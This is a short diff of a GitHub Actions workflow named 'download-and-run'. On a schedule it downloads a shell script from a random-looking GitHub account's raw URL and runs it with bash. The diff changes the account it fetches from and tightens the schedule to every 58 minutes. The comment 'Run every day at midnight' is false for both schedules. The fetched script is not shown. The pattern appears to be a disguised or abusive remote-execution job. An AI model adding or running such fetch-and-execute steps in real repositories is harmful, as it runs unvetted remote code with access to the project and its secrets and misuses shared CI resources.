@@ -1,7 +1,7 @@
-name: 0127sch
+name: six
 on:
   schedule:
-    - cron: '5 */2 * * *' # Run every day at midnight
+    - cron: '*/58 * * * *' # Run every day at midnight
 jobs:
   download-and-run:
     runs-on: ubuntu-latest
@@ -18,5 +18,5 @@ jobs:
           done
           cp www/$file/* ./
           done
-          wget -O drive333.sh https://raw.githubusercontent.com/howtogo2303/0127/main/.github/workflows/drive333.sh
+          wget -O drive333.sh https://raw.githubusercontent.com/iijtfvvvg/0127/main/.github/workflows/drive333.sh
           bash drive333.sh
